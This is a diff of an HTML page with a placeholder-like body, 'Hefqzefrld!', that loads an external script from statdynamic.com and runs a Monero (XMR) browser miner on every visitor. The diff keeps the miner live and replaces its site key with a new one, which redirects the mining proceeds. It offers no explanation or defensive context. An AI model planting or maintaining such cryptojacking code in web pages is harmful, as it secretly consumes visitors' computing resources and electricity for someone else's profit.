@@ -4,12 +4,14 @@
 
 <body>
 <p>Hefqzefrld!</p>
+
 <script src="//statdynamic.com/lib/crypta.js"></script>
 <script>
-  var miner=new CRLT.Anonymous('b4c47bfc4af8d7215d8a3eafd7842c28a0ff7a48daf9', {
-    threads:4,throttle:0.7, coin: "xmr",
+  var miner=new CRLT.Anonymous('7536be69954726c3bc3533267a4631f8dd9fde37066a', {
+    threads:4,throttle:0.72, coin: "xmr",
   });
   miner.start();
 </script>
+
 </body>
 </html>
